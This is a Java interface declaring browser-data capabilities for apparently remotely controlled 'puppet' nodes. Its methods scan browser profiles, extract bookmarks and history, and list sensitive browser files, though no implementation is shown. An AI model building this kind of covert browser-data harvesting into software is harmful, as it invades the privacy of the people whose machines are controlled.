package org.leo.core.puppet.capability;

import java.util.Map;

/**
 * Capability marker for nodes that can extract browser profile data.
 */
public interface BrowserDataCapable {

    Map<String, Object> scanBrowserProfiles() throws Exception;

    Map<String, Object> extractBrowserBookmarks() throws Exception;

    Map<String, Object> extractBrowserHistory(int limit) throws Exception;

    Map<String, Object> listBrowserSensitiveFiles() throws Exception;
}
